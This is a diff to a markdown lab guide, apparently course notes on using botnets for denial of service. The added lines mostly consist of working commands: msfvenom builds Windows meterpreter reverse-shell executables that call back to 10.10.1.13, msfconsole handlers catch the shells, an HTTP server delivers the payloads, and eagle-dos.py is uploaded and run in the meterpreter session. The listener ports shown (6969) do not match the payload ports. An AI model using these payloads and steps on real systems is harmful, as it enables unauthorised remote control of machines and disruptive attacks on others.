@@ -83,13 +83,31 @@ IF u have access to the victim machine u can check the resources in **Resmon**
 In the lab the use of botnets is done by getting the reverse shell on different targets
 transferring the `eagle-dos.py` to all the different targets using
 
+Run the below bash commands to generate reverse shell exe for botnets
+```bash
+msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.1.13 lport=3333 -f exe > exploit1.exe
+msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.1.13 lport=4444 -f exe > exploit2.exe
+msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.1.13 lport=5555 -f exe > exploit3.exe
+```
+
+In Linux terminal run the belows cmds to catch the reverse shell
+```bash
+msfconsole -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set lhost 10.10.1.13; set lport 6969; run"
+msfconsole -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set lhost 10.10.1.13; set lport 6969; run"
+msfconsole -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set lhost 10.10.1.13; set lport 6969; run"
+```
+Then run server and download the exe and execute it
+-> python3 -m http.server 8000
+
+In the meterpreter shell, upload the below python based dos script
 ```bash
 upload /home/attacker/Downloads/eagle-dos.py
 ```
 
-and then running the python script using
+and then running the python script in the powershell using
 ```
-python eagle-dos.py
+shell
+python .\eagle-dos.py
 ```
 
 ## Detect and Protect 
